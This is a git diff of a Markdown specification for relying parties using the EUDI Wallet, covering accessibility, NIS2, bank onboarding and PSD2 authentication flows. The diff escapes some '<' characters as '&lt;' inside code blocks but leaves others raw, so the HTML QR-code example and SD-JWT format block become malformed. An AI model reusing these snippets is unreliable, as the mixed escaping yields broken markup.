 | **1.4.3** | Contrast (Minimum) | All RP UI text | Minimum 4.5:1 contrast ratio for normal text, 3:1 for large text (≥18pt or ≥14pt bold) |
 | **1.4.11** | Non-text Contrast | QR code, buttons, form controls | QR code borders must have ≥3:1 contrast against background. All interactive controls must meet this threshold |
@@ -14775,7 +15177,7 @@ The following table maps the most critical WCAG 2.1 AA and WCAG 2.2 success crit
 | **2.2.1** | Timing Adjustable | QR code with timeout | If the QR code expires, provide a mechanism to request a new one and warn before expiry |
 | **2.4.3** | Focus Order | Consent screen | Tab order must be logical: RP identity → attribute list → purpose → approve → reject → cancel |
 | **2.5.8** | Target Size (Minimum) | All interactive targets | Clickable/tappable targets must have a minimum size of **24×24 CSS pixels** (WCAG 2.2 AA). Mobile RP apps should aim for platform guidelines: 44×44pt (Apple) or 48×48dp (Material Design) |
-| **3.1.1** | Language of Page | All RP pages | Declare the page language via `lang` attribute on `<html>`. Essential for screen reader pronunciation |
+| **3.1.1** | Language of Page | All RP pages | Declare the page language via `lang` attribute on `&lt;html>`. Essential for screen reader pronunciation |
 | **3.1.2** | Language of Parts | Consent screen with translated attribute names | If attribute names are in a different language from the page, mark them with the `lang` attribute |
 | **3.3.1** | Error Identification | Error pages | If verification fails, identify the error in text — not just a red border. "Verification timed out — the QR code has expired" |
 | **3.3.3** | Error Suggestion | Error pages | Provide actionable suggestions: "Please request a new QR code" or "Try again using the direct link below" |
@@ -14797,22 +15199,22 @@ RPs MUST provide **at least one alternative invocation method** alongside the QR
 **Accessible QR code markup pattern:**
 
 ```html
-<figure role="img" aria-labelledby="qr-label" aria-describedby="qr-desc">
+&lt;figure role="img" aria-labelledby="qr-label" aria-describedby="qr-desc">
   <img src="/qr/session-abc123.svg"
        alt="QR code for identity verification with EUDI Wallet"
        style="min-width: 200px; min-height: 200px; border: 4px solid #000;" />
-  <figcaption id="qr-label">
+  &lt;figcaption id="qr-label">
     Scan this QR code with your EUDI Wallet to verify your identity
-  </figcaption>
+  &lt;/figcaption>
   <p id="qr-desc" class="visually-hidden">
     Alternatively, use one of the accessible options below.
   </p>
-</figure>
+&lt;/figure>
 
-<!-- Accessible alternatives -->
+&lt;!-- Accessible alternatives -->
 <div role="group" aria-label="Alternative verification methods">
   <a href="openid4vp://authorize?..." class="btn-primary">Open in EUDI Wallet</a>
-  <button onclick="copyToClipboard('openid4vp://authorize?...')">Copy verification link</button>
+  &lt;button onclick="copyToClipboard('openid4vp://authorize?...')">Copy verification link&lt;/button>
 </div>
 ```
 
@@ -14824,9 +15226,9 @@ RPs MUST provide **at least one alternative invocation method** alongside the QR
 
 | Pattern | Implementation | WCAG SC |
 |:--------|:---------------|:--------|
-| **Semantic structure** | Use `<h1>`→`<h2>` hierarchy for screen reader navigation. Use `<dl>` for name-value pairs, `<table>` for attribute lists. | 1.3.1, 2.4.6 |
+| **Semantic structure** | Use `<h1>`→`<h2>` hierarchy for screen reader navigation. Use `&lt;dl>` for name-value pairs, `<table>` for attribute lists. | 1.3.1, 2.4.6 |
 | **Focus management** (modal) | `role="dialog"`, `aria-modal="true"`, `aria-labelledby` pointing to dialog title. Trap focus inside dialog; restore on dismiss. | 2.1.2, 2.4.3 |
-| **Descriptive labels** | Every interactive element must have a programmatic name. "Approve" and "Reject" must be `<button>` elements with descriptive text, not icon-only. | 4.1.2, 2.4.6 |
+| **Descriptive labels** | Every interactive element must have a programmatic name. "Approve" and "Reject" must be `&lt;button>` elements with descriptive text, not icon-only. | 4.1.2, 2.4.6 |
 | **No auto-action** | Do not automatically redirect to a Wallet app without user action. Let the user deliberately click "Open in EUDI Wallet". | 3.2.1 |
 | **Clear language** | Avoid technical jargon on user-facing pages: "PID" → "Personal ID", "QEAA" → "Verified credential", "mDL" → "Digital driving licence". | 3.1.1 |
 
@@ -14859,7 +15261,7 @@ Cross-border scenarios — e.g., a Spanish citizen verifying identity at a Germa
 
 | Aspect | Requirement | Standard |
 |:-------|:------------|:---------|
-| **Page language declaration** | Set `lang` attribute on `<html>` to the page's primary language | WCAG 3.1.1 (Level A) |
+| **Page language declaration** | Set `lang` attribute on `&lt;html>` to the page's primary language | WCAG 3.1.1 (Level A) |
 | **Language of parts** | If attribute names or values are in a different language, wrap them in elements with the appropriate `lang` attribute | WCAG 3.1.2 (Level AA) |
 | **Multi-language support** | RP SHOULD detect the user's browser language (`Accept-Language` header) and offer content in that language if available | ARF Design Guide §2.12 |
 | **Attribute label translation** | Display PID attribute names as localised, user-facing labels — not raw schema identifiers like `family_name` | ARF user-centricity principle |
@@ -14889,7 +15291,7 @@ The **NIS2 Directive** — Directive (EU) 2022/2555 — enhances cybersecurity r
 | **Public administration** (Annex I §11) | Government portals performing eID verification | Essential |
 | **Digital providers** (Annex II §7) | E-commerce platforms requesting age verification (§19) | Important |
 
-> **Scope boundaries**: Not all RPs that integrate with the EUDI Wallet are NIS2 entities. Small enterprises (<50 employees AND <€10M turnover), micro-enterprises (<10 employees, <€2M turnover), and sectors not listed in Annex I/II (hospitality, retail non-online, real estate, education) are generally **not** covered by NIS2 — unless they are trust service providers or sole national providers.
+> **Scope boundaries**: Not all RPs that integrate with the EUDI Wallet are NIS2 entities. Small enterprises (&lt;50 employees AND &lt;€10M turnover), micro-enterprises (&lt;10 employees, &lt;€2M turnover), and sectors not listed in Annex I/II (hospitality, retail non-online, real estate, education) are generally **not** covered by NIS2 — unless they are trust service providers or sole national providers.
 
 NIS2 Art. 21(2) enumerates **10 mandatory cybersecurity risk-management measures**. DR-0002 already addresses the majority of these requirements through existing content — but without labelling them as NIS2-relevant. The following table makes these connections explicit:
 
@@ -15098,7 +15500,8 @@ sequenceDiagram
 
 #### 22.1.1 CDD Payload Walkthrough
 
-<details><summary><strong>1. Customer initiates onboarding at Bank web/app</strong></summary>
+<details>
+<summary><strong>1. Customer initiates onboarding at Bank web/app</strong></summary>
 
 The prospective customer initiates the account opening process on the Bank's website or mobile app (e.g., clicking *"Open Account"* on a digital bank's landing page). The Bank's onboarding system creates a CDD session and determines that EUDI Wallet identity verification is available. Under AMLD Art. 13, the Bank must perform Customer Due Diligence (CDD) before establishing a business relationship — verifying the customer's identity, understanding the nature of the business relationship, and screening against sanctions/PEP databases.
 
@@ -15107,7 +15510,8 @@ The prospective customer initiates the account opening process on the Bank's web
 > **LoA Verification**: AMLD CDD requires identity verification using "reliable, independent source documents." EUDI Wallet PID at LoA High satisfies this requirement. See §11.11 for the LoA inference algorithm and trust chain validation procedure.
 
 </details>
-<details><summary><strong>2. Bank builds DCQL query for CDD attributes</strong></summary>
+<details>
+<summary><strong>2. Bank builds DCQL query for CDD attributes</strong></summary>
 
 The Bank constructs a DCQL query requesting the minimum PID attributes needed for AMLD Customer Due Diligence:
 
@@ -15141,7 +15545,8 @@ The Bank constructs a DCQL query requesting the minimum PID attributes needed fo
 **Artifact Produced:** Generated DCQL credential query JSON payload requesting the 9 AMLD-mandated attributes explicitly.
 
 </details>
-<details><summary><strong>3. Bank sends OpenID4VP request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>3. Bank sends OpenID4VP request to Wallet Unit</strong></summary>
 
 The Bank wraps the DCQL query in a signed OpenID4VP Authorization Request (JAR) and transmits it to the Wallet Unit (via QR code for cross-device or deep link for same-device). The `purpose` extension ideally informs the Wallet User of the lawful basis:
 
@@ -15181,7 +15586,8 @@ The Bank wraps the DCQL query in a signed OpenID4VP Authorization Request (JAR) 
 **Artifact Produced:** Signed OpenID4VP Authorization Request (JAR) encoding the DCQL query and the ETSI/CDD intended use metadata.
 
 </details>
-<details><summary><strong>4. Wallet Unit displays consent screen to Customer</strong></summary>
+<details>
+<summary><strong>4. Wallet Unit displays consent screen to Customer</strong></summary>
 
 The Wallet verifies the Bank's JAR (WRPAC chain, revocation, `client_id` matching) and displays a consent screen showing:
 
@@ -15193,23 +15599,25 @@ The Wallet verifies the Bank's JAR (WRPAC chain, revocation, `client_id` matchin
 For CDD use cases, the attribute list is longer than typical presentations (9 claims vs. 1–3 for age verification). The Wallet should present the list in a scrollable, structured format grouped by category (identity, nationality, address).
 
 </details>
-<details><summary><strong>5. Customer approves attribute disclosure</strong></summary>
+<details>
+<summary><strong>5. Customer approves attribute disclosure</strong></summary>
 
 The Customer reviews the 9 requested CDD attributes and approves via biometric or PIN authentication (LoA High). The Customer should understand that CDD data will be retained by the Bank for the duration of the business relationship (AMLD Art. 40 — minimum 5 years after the relationship ends). Unlike transient verifications (e.g., age checks), CDD consent implies long-term data storage.
 
 > **Selective disclosure in CDD context**: While SD-JWT enables selective disclosure, CDD use cases typically require all requested attributes — a Customer who declines to share `personal_identifier` or `resident_address` will fail the Bank's CDD check. The Wallet should indicate which attributes are marked as required vs. optional in the DCQL query.
 
 </details>
-<details><summary><strong>6. Wallet Unit sends encrypted PID presentation to Bank</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit sends encrypted PID presentation to Bank</strong></summary>
 
 The Wallet encrypts the response into a JWE and posts it to the Bank's `response_uri`. The decrypted payload contains the SD-JWT VC with all CDD-required attributes selectively disclosed:
 
 ```
-<Issuer-signed JWT>~<Disclosure:family_name>~<Disclosure:given_name>~
-<Disclosure:birth_date>~<Disclosure:nationality>~
-<Disclosure:personal_identifier>~<Disclosure:resident_address>~
-<Disclosure:resident_city>~<Disclosure:resident_postal_code>~
-<Disclosure:resident_country>~<KB-JWT>
+&lt;Issuer-signed JWT>~&lt;Disclosure:family_name>~&lt;Disclosure:given_name>~
+&lt;Disclosure:birth_date>~&lt;Disclosure:nationality>~
+&lt;Disclosure:personal_identifier>~&lt;Disclosure:resident_address>~
+&lt;Disclosure:resident_city>~&lt;Disclosure:resident_postal_code>~
+&lt;Disclosure:resident_country>~&lt;KB-JWT>
 ```
 
 Decoded disclosures (base64url → JSON array):
@@ -15241,7 +15649,8 @@ Key Binding JWT payload (proves Wallet Unit possesses the device key):
 **Artifact Produced:** Base64url-encoded SD-JWT VC array mapped to the CDD disclosures, coupled with the KB-JWT device proof payload.
 
 </details>
-<details><summary><strong>7. Bank verifies PID signature, disclosures, and device binding</strong></summary>
+<details>
+<summary><strong>7. Bank verifies PID signature, disclosures, and device binding</strong></summary>
 
 The Bank performs the complete SD-JWT VC verification pipeline (§5.4.2):
 
@@ -15257,7 +15666,8 @@ For CDD, the verification must be performed with the highest rigour — a false 
 **Audit Telemetry:** The Bank MUST log a `CDD_PID_VERIFICATION_FAILED` severe security event.
 
 </details>
-<details><summary><strong>8. Bank checks PID revocation via Status List</strong></summary>
+<details>
+<summary><strong>8. Bank checks PID revocation via Status List</strong></summary>
 
 The Bank queries the PID Provider's Token Status List (§5.4.2 step 3) using the `status.status_list.uri` and `status.status_list.idx` from the Issuer-JWT. The Bank fetches the Status List Token JWT, verifies its signature, decompresses the DEFLATE bitstring, and checks the bit at the specified index.
 
@@ -15268,7 +15678,8 @@ For CDD, revocation checking is **mandatory** — the Bank must not onboard a cu
 **Audit Telemetry:** The Bank MUST log a `CDD_REVOKED_PID_PRESENTED` alert.
 
 </details>
-<details><summary><strong>9. Status List confirms PID credential validity to Bank</strong></summary>
+<details>
+<summary><strong>9. Status List confirms PID credential validity to Bank</strong></summary>
 
 The Status List returns bit value `0` (VALID). The identity verification portion of CDD is now cryptographically complete — the Bank has: (a) a cryptographically verified identity (PID signed by a Member State–notified PID Provider), (b) proof of device possession (KB-JWT), (c) confirmation the credential is not revoked, and (d) 9 verified CDD attributes.
 
@@ -15277,7 +15688,8 @@ This is the functional equivalent of a traditional KYC identity check (passport 
 **Artifact Produced:** Parsed Status List Token state locally verifying the specific JWT `idx` bit as 0 (VALID).
 
 </details>
-<details><summary><strong>10. Bank runs AML screening against verified PID attributes</strong></summary>
+<details>
+<summary><strong>10. Bank runs AML screening against verified PID attributes</strong></summary>
 
 With a verified identity, the Bank runs its mandatory AML and sanctions screening against the extracted attributes (Name, DOB, Nationality, Address against Sanctions lists and PEP databases).
 
@@ -15318,7 +15730,8 @@ flowchart TD
 > **Key advantage**: The PID's `personal_identifier` attribute enables the bank to perform authoritative identity matching against national registries — something impossible with traditional document scanning where OCR errors are common. The cryptographic device binding (KB-JWT) proves the presentation originates from a genuine Wallet Unit, eliminating document forgery risk.
 
 </details>
-<details><summary><strong>11. Bank requests additional EDD attestations from Wallet Unit if required</strong></summary>
+<details>
+<summary><strong>11. Bank requests additional EDD attestations from Wallet Unit if required</strong></summary>
 
 If the AML screening (step 10) flags elevated risk — e.g., the Customer is a Politically Exposed Person (PEP), has a nationality from a FATF high-risk jurisdiction, or the `personal_identifier` matches a watch list entry — the Bank triggers an Enhanced Due Diligence (EDD) workflow. The Bank sends a **second** OpenID4VP request to the Wallet Unit, requesting additional Qualified Electronic Attestation of Attributes (QEAAs):
 
@@ -15330,26 +15743,30 @@ If the AML screening (step 10) flags elevated risk — e.g., the Customer is a P
 The availability of these QEAAs depends on Member State implementation and the Attestation Provider ecosystem maturity (§22.3). In early EUDI deployments, many EDD attestations may not yet exist in digital form, requiring the Bank to fall back to traditional document submission.
 
 </details>
-<details><summary><strong>12. Wallet Unit displays consent screen for additional attestations</strong></summary>
+<details>
+<summary><strong>12. Wallet Unit displays consent screen for additional attestations</strong></summary>
 
 The Wallet displays a new consent screen for the EDD attestations. This screen is distinct from the initial CDD consent (step 4) — it shows different credential types (QEAAs from different issuers) and may involve credentials the Customer is less familiar with. The Wallet should clearly indicate that this is a follow-up request from the same Bank, linked to the ongoing onboarding session.
 
 > **Multi-credential consent**: If the Bank requests multiple EDD attestations in a single DCQL query (using the `credentials` array), the Wallet should display all requested attestations on a single consent screen. If requested as separate transactions, each gets its own consent screen.
 
 </details>
-<details><summary><strong>13. Customer approves secondary attestation request</strong></summary>
+<details>
+<summary><strong>13. Customer approves secondary attestation request</strong></summary>
 
 The Customer reviews and approves the EDD attestation request with biometric/PIN authentication. The Customer may not possess all requested QEAAs — in this case, the Wallet should indicate which credentials are available (with checkmarks) and which are missing. If a required QEAA is not available, the Bank must provide an alternative path (e.g., manual document upload).
 
 </details>
-<details><summary><strong>14. Wallet Unit sends additional attestation presentation to Bank</strong></summary>
+<details>
+<summary><strong>14. Wallet Unit sends additional attestation presentation to Bank</strong></summary>
 
 The Wallet encrypts and sends the EDD attestation presentation to the Bank's `response_uri` (may be a different endpoint from the CDD callback, e.g., `/oid4vp/edd-callback`). The response follows the same JWE format as step 6: SD-JWT VC with KB-JWT for each disclosed QEAA. The Bank correlates this response with the CDD session using the `state` parameter.
 
 > **Cross-issuer verification**: Unlike the initial PID (issued by a single PID Provider), EDD attestations may come from multiple issuers (employer, tax authority, immigration office). The Bank must verify each issuer's signature against the appropriate LoTE trust anchor — potentially different LoTEs per issuer type.
 
 </details>
-<details><summary><strong>15. Bank reaches final CDD decision (APPROVED / REJECTED)</strong></summary>
+<details>
+<summary><strong>15. Bank reaches final CDD decision (APPROVED / REJECTED)</strong></summary>
 
 The Bank's CDD engine correlates all verified data — the 9 PID attributes (step 6), the AML screening results (step 10), and any EDD attestations (step 14) — to reach a final onboarding decision:
 
@@ -15365,7 +15782,8 @@ The Bank stores the CDD evidence package (verified attribute values, verificatio
 **Artifact Produced:** Completed and cryptographically sealed CDD evidence package, stored immutably in the Bank's KYC vault.
 
 </details>
-<details><summary><strong>16. Bank notifies Customer of account opening or review status</strong></summary>
+<details>
+<summary><strong>16. Bank notifies Customer of account opening or review status</strong></summary>
 
 The Bank updates the onboarding session with the final decision:
 
@@ -15444,12 +15862,14 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Server extracts Issuer from PID</strong></summary>
+<details>
+<summary><strong>1. RP Server extracts Issuer from PID</strong></summary>
 
 Upon receiving the payload, the Relying Party parses the `iss` claim (for SD-JWT) or the MSO signing certificate to identify the foreign PID Provider.
 
 </details>
-<details><summary><strong>2. RP Server determines MS and fetches LoTE</strong></summary>
+<details>
+<summary><strong>2. RP Server determines MS and fetches LoTE</strong></summary>
 
 The RP infers the issuing Member State from the attribute payload and queries the EU Trusted List Browser (or its own caching layer) for that specific country's LoTE.
 
@@ -15458,14 +15878,16 @@ The RP infers the issuing Member State from the attribute payload and queries th
 **Audit Telemetry:** The RP Server logs a `LOTE_DISCOVERY_FETCH_FAILED` warning.
 
 </details>
-<details><summary><strong>3. Trust List returns Trust Anchor</strong></summary>
+<details>
+<summary><strong>3. Trust List returns Trust Anchor</strong></summary>
 
 The Trust List returns the specific MS trust anchor.
 
 **Artifact Produced:** Fetched Member State LoTE X.509 Trust Anchor data structure.
 
 </details>
-<details><summary><strong>4. RP Server validates PID signature against foreign Trust Anchor</strong></summary>
+<details>
+<summary><strong>4. RP Server validates PID signature against foreign Trust Anchor</strong></summary>
 
 The Relying Party verifies the PID Provider's signing certificate directly against the newly acquired foreign Trust Anchor.
 
@@ -15474,7 +15896,8 @@ The Relying Party verifies the PID Provider's signing certificate directly again
 **Audit Telemetry:** The RP Server triggers a `LOTE_FOREIGN_TRUST_ANCHOR_VALIDATION_FAILED` alert.
 
 </details>
-<details><summary><strong>5. RP Server caches Trust Anchor</strong></summary>
+<details>
+<summary><strong>5. RP Server caches Trust Anchor</strong></summary>
 
 The RP stores the verified foreign MS trust anchor in its local, memory-resident cache, enforcing a TTL aligned to that MS's LoTE update frequency to prevent stale cryptographic material.
 
@@ -15862,42 +16285,48 @@ sequenceDiagram
 
 > **Cross-reference**: This walkthrough mirrors the complete SCA protocol in §15. The steps below provide the bank-specific operational context; §15 contains the normative protocol specification.
 
-<details><summary><strong>1. Payment Service User requests wallet registration for payment account</strong></summary>
+<details>
+<summary><strong>1. Payment Service User requests wallet registration for payment account</strong></summary>
 
 The PSU initiates SCA Attestation enrollment by requesting to register their EUDI Wallet as an SCA method for a specific payment account and instrument. This is typically triggered via the PSP's mobile banking app or web interface — e.g., a "Register EUDI Wallet for payments" option in the security settings.
 
 The PSP must capture the target payment account (IBAN) and payment instrument (card PAN or account reference) to bind the SCA Attestation to a specific account-instrument pair (TS12 §3.2).
 
 </details>
-<details><summary><strong>2. Bank/PSP authenticates PSU via existing PSD2 SCA method</strong></summary>
+<details>
+<summary><strong>2. Bank/PSP authenticates PSU via existing PSD2 SCA method</strong></summary>
 
 Before issuing an SCA Attestation into the wallet, the PSP must first verify the PSU's identity using an **existing** PSD2-compliant SCA method (SMS OTP, hardware token, banking app push). This is a bootstrapping requirement — the wallet cannot be used for SCA until an attestation has been issued into it.
 
 This step satisfies RTS Art. 24(2)(b): the association of PSCs with a new authentication device must itself be performed using SCA. The wallet is the "new device" being onboarded.
 
 </details>
-<details><summary><strong>3. Payment Service User completes existing SCA</strong></summary>
+<details>
+<summary><strong>3. Payment Service User completes existing SCA</strong></summary>
 
 The PSU successfully completes the legacy SCA challenge (e.g., enters SMS OTP, approves banking app push notification, or inserts hardware token). This confirms the PSU controls the payment account and authorises the issuance of a new SCA credential into the wallet.
 
 **Failure Path:** If SCA fails (wrong OTP, timeout, push rejection), the PSP terminates the enrollment flow and logs a `SCA_ENROLLMENT_FAILED` event.
 
 </details>
-<details><summary><strong>4. Bank/PSP issues SCA Attestation to EUDI Wallet via OID4VCI</strong></summary>
+<details>
+<summary><strong>4. Bank/PSP issues SCA Attestation to EUDI Wallet via OID4VCI</strong></summary>
 
 The PSP acts as a Credential Issuer under the OpenID for Verifiable Credential Issuance (OID4VCI) protocol. It issues a device-bound SCA Attestation containing the payment account reference, instrument identifier, and the PSP's signing key.
 
 The attestation is an SD-JWT-VC with credential type `eu.europa.ec.eudi.sca.1` (TS12). The `cnf` claim binds the attestation to the wallet's device key — ensuring it can only be presented from the specific wallet instance that generated the key pair.
 
 </details>
-<details><summary><strong>5. EUDI Wallet generates key pair in WSCD, stores private key</strong></summary>
+<details>
+<summary><strong>5. EUDI Wallet generates key pair in WSCD, stores private key</strong></summary>
 
 The Wallet Unit instructs the WSCD (Secure Element, TEE, or remote HSM) to generate an asymmetric key pair. The private key never leaves the WSCD — it is used exclusively for signing KB-JWTs during presentation. The public key is exported for binding.
 
 This is the cryptographic foundation of the **possession** factor under PSD2 RTS Art. 7: the PSU possesses the device containing the WSCD with the bound private key.
 
 </details>
-<details><summary><strong>6. EUDI Wallet returns public key binding to Bank/PSP</strong></summary>
+<details>
+<summary><strong>6. EUDI Wallet returns public key binding to Bank/PSP</strong></summary>
 
 The wallet sends the public key to the PSP as a `cnf.jwk` claim in the OID4VCI credential response. The PSP stores this public key alongside the SCA Attestation record, enabling future verification of KB-JWT signatures.
 
@@ -15915,57 +16344,66 @@ The wallet sends the public key to the PSP as a `cnf.jwk` claim in the OID4VCI c
 ```
 
 </details>
-<details><summary><strong>7. Bank/PSP binds SCA Attestation to payment account and instrument</strong></summary>
+<details>
+<summary><strong>7. Bank/PSP binds SCA Attestation to payment account and instrument</strong></summary>
 
 The PSP completes the enrollment by recording the binding: SCA Attestation ID ↔ payment account (IBAN) ↔ payment instrument ↔ public key (`cnf.jwk`). This binding enables the PSP to verify, during future transactions, that the SCA Attestation presented was issued for the specific account and instrument being used.
 
 **Audit Telemetry:** The PSP logs a `SCA_ATTESTATION_ISSUED` event with the attestation ID, account reference (hashed), and WSCD type.
 
 </details>
-<details><summary><strong>8. Payment Service User initiates SCA-protected action</strong></summary>
+<details>
+<summary><strong>8. Payment Service User initiates SCA-protected action</strong></summary>
 
 The PSU triggers an action requiring SCA — any of the six triggers defined in the SCA trigger table (§24.3.3): account login (a), payment initiation (b), TPP consent (c₁), trusted beneficiary management (c₂), other remote actions (c₃), or authenticator binding (d). The PSU selects the EUDI Wallet as their preferred SCA method.
 
 </details>
-<details><summary><strong>9. Bank/PSP sends OpenID4VP request to EUDI Wallet</strong></summary>
+<details>
+<summary><strong>9. Bank/PSP sends OpenID4VP request to EUDI Wallet</strong></summary>
 
 The PSP constructs an OpenID4VP Authorization Request with a DCQL query requesting the SCA Attestation. For payment transactions, the request includes `transaction_data` containing the amount and payee for dynamic linking (PSD2 Art. 97(2)). For non-payment actions (login, TPP consent), `transaction_data` may be omitted or contain action-specific context.
 
 The request is delivered via the appropriate channel: same-device intent (mobile) or cross-device QR code / `request_uri` (web).
 
 </details>
-<details><summary><strong>10. EUDI Wallet displays action details to Payment Service User for confirmation</strong></summary>
+<details>
+<summary><strong>10. EUDI Wallet displays action details to Payment Service User for confirmation</strong></summary>
 
 The Wallet UI presents the action details to the PSU for explicit confirmation. For payments, this includes the amount and payee (RTS Art. 5(1)(a) — payer awareness). For non-payment actions, the wallet displays the relying party identity and the requested attestation type.
 
 The wallet also displays the PSP's identity from the WRPAC, enabling the PSU to verify they are authenticating to the correct institution.
 
 </details>
-<details><summary><strong>11. Payment Service User confirms action via PIN or biometric</strong></summary>
+<details>
+<summary><strong>11. Payment Service User confirms action via PIN or biometric</strong></summary>
 
 The PSU explicitly authorises the action by providing a second authentication factor: PIN (knowledge) or biometric (inherence). Combined with the WSCD private key (possession), this completes the multi-factor SCA requirement (PSD2 Art. 4(30): at least two of knowledge, possession, inherence).
 
 **Failure Path:** If the PSU rejects the action or biometric verification fails, the wallet returns an error response and the PSP denies the action.
 
 </details>
-<details><summary><strong>12. EUDI Wallet instructs WSCD to sign request hash with private key</strong></summary>
+<details>
+<summary><strong>12. EUDI Wallet instructs WSCD to sign request hash with private key</strong></summary>
 
 The wallet computes a hash over the request parameters (nonce, audience, and — for payments — `transaction_data`) and submits it to the WSCD for signing. The WSCD produces an ECDSA signature using the bound private key that never leaves the secure element.
 
 This signature constitutes the **authentication code** under RTS Art. 5: it is dynamically linked to the specific action being authenticated.
 
 </details>
-<details><summary><strong>13. WSCD returns KB-JWT to EUDI Wallet</strong></summary>
+<details>
+<summary><strong>13. WSCD returns KB-JWT to EUDI Wallet</strong></summary>
 
 The WSCD returns the signed KB-JWT (Key Binding JWT) to the wallet. The KB-JWT contains the `nonce` (replay protection), `aud` (PSP identifier), `iat` (issuance timestamp), and — for payment transactions — `transaction_data_hashes` (dynamic linking).
 
 </details>
-<details><summary><strong>14. EUDI Wallet sends VP Token to Bank/PSP</strong></summary>
+<details>
+<summary><strong>14. EUDI Wallet sends VP Token to Bank/PSP</strong></summary>
 
 The wallet constructs a VP Token containing the SCA Attestation (SD-JWT-VC with selective disclosures) and the KB-JWT, then transmits it to the PSP's `direct_post` endpoint via the `direct_post.jwt` response mode (encrypted with the PSP's public key from the WRPAC).
 
 </details>
-<details><summary><strong>15. Bank/PSP verifies signature, nonce, freshness, and dynamic linking</strong></summary>
+<details>
+<summary><strong>15. Bank/PSP verifies signature, nonce, freshness, and dynamic linking</strong></summary>
 
 The PSP performs the complete verification pipeline:
 1. **Decrypt** the JARM response using its WRPAC private key
@@ -15979,7 +16417,8 @@ The PSP performs the complete verification pipeline:
 **Failure Path:** Any verification failure results in SCA rejection. The PSP logs the failure reason and denies the action.
 
 </details>
-<details><summary><strong>16. Bank/PSP confirms action authorised to Payment Service User</strong></summary>
+<details>
+<summary><strong>16. Bank/PSP confirms action authorised to Payment Service User</strong></summary>
 
 The PSP confirms the successfully authenticated action to the PSU. For payments, this is the transaction authorisation confirmation. For account login, this establishes the authenticated session. For TPP consent, this records the SCA-backed authorisation in the PSP's consent registry.
 
@@ -16159,7 +16598,8 @@ This means requesting a supplementary biometric liveness check is **not an obstr
 2. State the intended use as "Biometric liveness matching for AML/CDD compliance"
 3. The Wallet User interface will display this request; the User retains sole control over disclosure
 
-<details><summary><strong>Liability distribution — why supplementary checks matter</strong></summary>
+<details>
+<summary><strong>Liability distribution — why supplementary checks matter</strong></summary>
 
 | Scenario | Attack Vector | Liable Party | Rationale |
 |:---------|:-------------|:-------------|:----------|
@@ -16317,7 +16757,8 @@ The Wallet User sees **both names** (CIR 2025/848 Annex V point 3(j)): "Group IT
 | Centralised monitoring & incident response | Intended use declarations (per entity) |
 | Core compliance assessment (platform-level VCQ) | Privacy policies (per entity, GDPR) |
 
-<details><summary><strong>Passported institutions and RP registration</strong></summary>
+<details>
+<summary><strong>Passported institutions and RP registration</strong></summary>
 
 Financial institutions operating cross-border under passporting regimes (CRD IV, PSD2, Solvency II, MiFID II) face a specific question: does passporting exempt from RP registration?
 
@@ -16332,7 +16773,8 @@ Financial institutions operating cross-border under passporting regimes (CRD IV,
 
 </details>
 
-<details><summary><strong>Dual-role entities (RP + Attestation Provider)</strong></summary>
+<details>
+<summary><strong>Dual-role entities (RP + Attestation Provider)</strong></summary>
 
 Banks may operate as both RP (consuming PID for KYC) and QEAA Provider (issuing payment account attestations). CIR 2025/848 Annex I Point 12 supports multiple entitlements per registration (`Service_Provider` + `QEAA_Provider`). However, eIDAS Reg. Art. 45h imposes **functional separation**: KYC data obtained through the RP role cannot be combined with attestation issuance data, even for the same customer.
 
@@ -16406,7 +16848,8 @@ These obligations apply to the **vendor** providing the integration product, not
 | 6 | Maintain audit trail demonstrating data non-storage compliance | eIDAS Reg. Art. 5b(10), CIR 2025/848 Art. 10 | §26.4.2 |
 | 7 | Support multi-wallet interoperability across all certified EUDI Wallets | CIR 2024/2982 Art. 5(1) | §26.7 |
 
-<details><summary><strong>Bank procurement checklist</strong> — vendor evaluation criteria for intermediary selection</summary>
+<details>
+<summary><strong>Bank procurement checklist</strong> — vendor evaluation criteria for intermediary selection</summary>
 
 | # | Procurement Check | What to Look For |
 |:-:|:------------------|:-----------------|
@@ -16415,7 +16858,7 @@ These obligations apply to the **vendor** providing the integration product, not
 | 3 | **Multi-wallet testing** | Vendor has tested against ≥2 wallet implementations (EU Reference Wallet + national) |
 | 4 | **RPRC management** | Vendor can issue per-client, per-use-case Registration Certificates |
 | 5 | **Transparency** | Wallet users see both vendor AND bank identity (dual-name presentation) |
-| 6 | **Incident response** | Vendor has <24h breach notification SLA aligned with CIR 2025/847 |
+| 6 | **Incident response** | Vendor has &lt;24h breach notification SLA aligned with CIR 2025/847 |
 | 7 | **DORA compatibility** | Contract includes DORA Art. 28–30 third-party risk management clauses |
 
 </details>
@@ -16519,7 +16962,8 @@ The obligation for banks/PSPs has been a major point of contention since eIDAS 2
 | 7 | Card payments need separate EMV 3DS flow | 🔄 In progress | EMVCo/Mastercard pilots |
 | 8 | Wallet is just for SCA, not KYC/onboarding | ✅ Settled | AMLR Art. 22(6)(b) + SUA=SCA bridge |
 
-<details><summary><strong>Dispute 1 ✅ SETTLED: "SUA ≠ SCA: The wallet is just a 2FA tool"</strong></summary>
+<details>
+<summary><strong>Dispute 1 ✅ SETTLED: "SUA ≠ SCA: The wallet is just a 2FA tool"</strong></summary>
 
 The Dutch PA argued that eIDAS 2.0's "strong user authentication" (SUA) merely refers to two-factor authentication (2FA), which is "only a small part of the complex concept that is SCA." They concluded that the EUDI Wallet can only serve as a "2FA tool" — not a complete SCA solution — and that PSPs cannot meet RTS requirements using it.
 
@@ -16531,7 +16975,8 @@ The EC's SUA/SCA synonymy clarification directly undercuts the Dutch PA's framin
 
 </details>
 
-<details><summary><strong>Dispute 2 ✅ SETTLED: "Banks do not control the EUDIW: RTS requires PSP control over PSCs"</strong></summary>
+<details>
+<summary><strong>Dispute 2 ✅ SETTLED: "Banks do not control the EUDIW: RTS requires PSP control over PSCs"</strong></summary>
 
 The Dutch PA argued that the RTS on SCA (Art. 22–27) requires PSPs to "ensure the safety, security, confidentiality of personalised security credentials" — but since the wallet falls outside the PSP's domain, they cannot fulfil this obligation.
 
@@ -16543,7 +16988,8 @@ The EC explicitly clarifies the control model: the PSP **issues** the SCA attest
 
 </details>
 
-<details><summary><strong>Dispute 3 ✅ SETTLED: "The EUDIW lacks dynamic linking functionality"</strong></summary>
+<details>
+<summary><strong>Dispute 3 ✅ SETTLED: "The EUDIW lacks dynamic linking functionality"</strong></summary>
 
 The Dutch PA claimed that "EUDIWs lack certain functionality" such as dynamic linking (RTS Art. 5), and therefore cannot fulfil SCA requirements for payment initiation.
 
